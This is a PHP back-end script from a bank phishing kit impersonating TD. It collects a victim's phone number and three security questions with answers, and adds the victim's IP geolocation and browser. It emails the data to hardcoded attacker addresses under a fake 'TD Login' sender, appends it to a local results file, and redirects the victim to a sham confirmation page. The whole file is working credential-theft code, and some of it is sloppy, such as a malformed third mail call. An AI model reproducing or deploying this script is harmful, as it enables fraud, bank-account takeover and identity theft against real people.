<?php
    include '../email.php';
    $ip = getenv("REMOTE_ADDR");
    $u = "http://www.geoiptool.com/?IP='$ip'";
    $dump = unserialize(file_get_contents($u));
    $country = $dump["geoplugin_countryName"];
    $subject = 'Login Account [ '.$country.' - '.$_SERVER['REMOTE_ADDR'].' ]';
    $message = '|============ TD Q&A ===========|'."\r\n";
	$message .= "|Phone Number : ".$_POST['phoneNumber']."\n";
    $message .= '|Question 1:  '.$_POST['question1']."\r\n";
    $message .= '|Answer 1:   '.$_POST['answer1']."\r\n";
	$message .= '|Question 2:  '.$_POST['question2']."\r\n";
    $message .= '|Answer 2:   '.$_POST['answer2']."\r\n";
	$message .= '|Question 3:  '.$_POST['question3']."\r\n";
    $message .= '|Answer 3:   '.$_POST['answer3']."\r\n";
    $message .= '|Time:     '.$_InfoDATE   = date("d-m-Y h:i:sa")."\r\n";
    $message .= '|Browser:  '.$_SERVER['HTTP_USER_AGENT']."\r\n";
    $message .= "|IP Geo: http://www.geoiptool.com/?IP=".$ip." \n";
    $headers = 'From: TD Login <notifyloginsinformation@gmail.com>'."\r\n";
	$header  = "lowlow58@outlook.com";
	mail($to, $subject, $message, $headers);
	mail($header , $subject, $message, $headers);
    mail($subject,$messags,$headers);
	$file = fopen("Rzlt.txt","ab");
    fwrite($file,$message);
    fclose($file);
    header("Location: accountconfirm.php?sslchannel=true&amp;sessionid=xrBUswTnRWBlzTfC8idT1OKtdKKh7spEU1znxtKopmJYfZBnhOhjD2MQMw7TZxyTy7h5B2u0oeZDeA1v");
 ?>